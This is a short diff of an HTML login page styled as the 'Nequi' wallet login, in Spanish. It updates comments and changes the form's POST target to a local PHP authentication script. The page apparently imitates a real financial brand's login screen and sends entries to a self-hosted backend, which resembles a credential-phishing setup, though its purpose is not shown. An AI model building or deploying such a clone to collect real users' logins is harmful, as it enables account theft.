@@ -5,7 +5,7 @@
   <title>Nequi Login</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <!-- CSS externo -->
+  <!-- ✅ CSS externo (ubicado en public/assets/css) -->
   <link rel="stylesheet" href="assets/css/login.css">
 
   <!-- Fuente opcional de Google -->
@@ -24,8 +24,8 @@
       <h1>Entra a tu Nequi</h1>
       <p>Podrás bloquear tu Nequi, consultar tus datos.</p>
       
-      <!-- 🔹 Ruta backend -->
-      <form method="POST" action="../backend/loginServiceAuthentication.php" autocomplete="off">
+      <!-- ✅ Backend: archivo PHP debe estar en public/backend -->
+      <form method="POST" action="backend/loginServiceAuthentication.php" autocomplete="off">
         <div class="nequi-field">
           <div class="input-group">
             <span class="input-indicativo">
